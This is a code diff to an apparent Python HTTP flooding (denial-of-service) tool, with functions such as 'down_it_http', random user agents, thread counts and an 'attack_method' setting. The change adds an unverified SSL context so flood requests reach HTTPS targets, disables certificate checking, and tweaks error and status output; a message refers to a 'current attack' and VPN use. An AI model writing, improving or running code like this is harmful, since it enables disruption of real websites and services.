@@ -1,6 +1,7 @@
 from optparse import OptionParser
 import time, sys, socket, threading, random, string
 import urllib.request
+import ssl
 
 
 def user_agent():
@@ -89,10 +90,13 @@ def down_it_http():
         http_headers['User-Agent'] = random.choice(uagent).strip()
 
         try:
+            context = ssl._create_unverified_context()
             urllib.request.urlopen(
-                urllib.request.Request(url, headers=http_headers)
+                urllib.request.Request(url, headers=http_headers),
+                context=context
             )
-        except:
+        except Exception as e:
+            print(e)
             print("\033[91mNo connection with server. It could be a reason of current attack or bad VPN connection."
                   " Program will continue working.\033[0m")
         else:
@@ -198,7 +202,7 @@ if __name__ == '__main__':
         connect_host()
 
     p = str(port) if port else '(22, 53, 80, 443)'
-    print("\033[92m", host, " port: ", p, " threads: ", thr, " resources: ", resource, "\033[0m")
+    print("\033[92m", host, " port: ", p, " threads: ", thr, " mothod: ", attack_method, "\033[0m")
     print("\033[94mPlease wait...\033[0m")
     user_agent()
     headers()
